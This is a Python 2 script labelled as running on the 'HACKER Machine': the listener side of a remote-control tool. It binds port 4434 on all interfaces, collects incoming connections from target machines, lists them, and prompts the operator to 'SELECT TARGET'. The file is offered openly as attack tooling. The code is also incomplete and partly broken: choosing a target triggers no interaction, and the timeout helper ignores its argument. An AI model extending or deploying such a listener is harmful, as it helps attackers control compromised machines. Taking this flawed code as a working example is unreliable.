1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
#!/usr/bin/python

############################
## Runs on HACKER Machine ##
############################

import os
import sys
import time
import socket
import platform

class MC:

	_sock = None
	_port = None
	_looper_host = None
	_plat = None

	INTERVAL = 0.8
	BUFFER = 1024
	SIG = "DONE\r\n\n"
	FLAG = "FILE_NONE\r\n\n"
	socks = []
	clients = []


	# constructor
	def __init__(self):
		self.init()

	# initializer
	def init(cls):
		# set the a new socket
		cls._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# set looper to receive all connections
		cls._looper_host = "0.0.0.0"
		# set the port
		cls._port = 4434
		# bind connections
		cls.bind_and_listen()
		# connect
		cls.start()


	# clean screen
	def clean(cls):
		cls.plat = platform.platform()
		if(cls.plat.startswith("lin") or cls.plat.startswith("Lin")):
			lin = lambda: os.system("clear")
			return lin()
		elif(cls.plat.startswith("win") or cls.plat.startswith("Win") ):
			win = lambda: os.system("cls")
			return win()
		else:
			drw = lambda: os.system("clear")
			return drw()


	# bind host & port
	def bind_and_listen(cls):
		try:
			cls._sock.bind((cls._looper_host, cls._port))
			cls._sock.listen(128)
		except socket.error as e:
			time.sleep(5)
			pass


	# refresh connections
	def refresh(cls):
		cls.clean()
		print '\nListening for clients...\n'
		if(len(cls.clients) > 0):
			for n in range(0,len(cls.clients)):
				print "[{}] Client: {}\n".format(str(n+1), cls.clients[n])
		else:
			print "...\n"
		# print exit option
		print "---\n"
		print "[0] Exit \n"
		print "\nPress Ctrl+C to interact with client."


	# timeout socket
	def wait(cls, sec):
		cls._sock.settimeout(10)


	# accept connection
	# return -> socket object, ip address as string
	def accept(cls):
		return cls._sock.accept()


	# connect to target machine
	def start(cls):
		while True:
			cls.refresh()
			try:
				
				try:
					cls.wait(10)
					sock, addr =  cls.accept()
				except socket.timeout:
					continue
				
				if(sock):
					sock.settimeout(None)
					cls.socks.append(sock)
					cls.clients.append(addr)
				
				cls.refresh()
				time.sleep(cls.INTERVAL)
			
			except KeyboardInterrupt:
				cls.refresh()

				choice = input("\nSELECT TARGET: ")

				if(choice == 0):
					print "\nExiting...\n"
					for n in range(len(cls.socks)):
						cls.socks[n].close()
					sys.exit()
				choice -= 1
				cls.refresh()




		
def main():
	mc = MC()


if __name__ == '__main__':
	main()






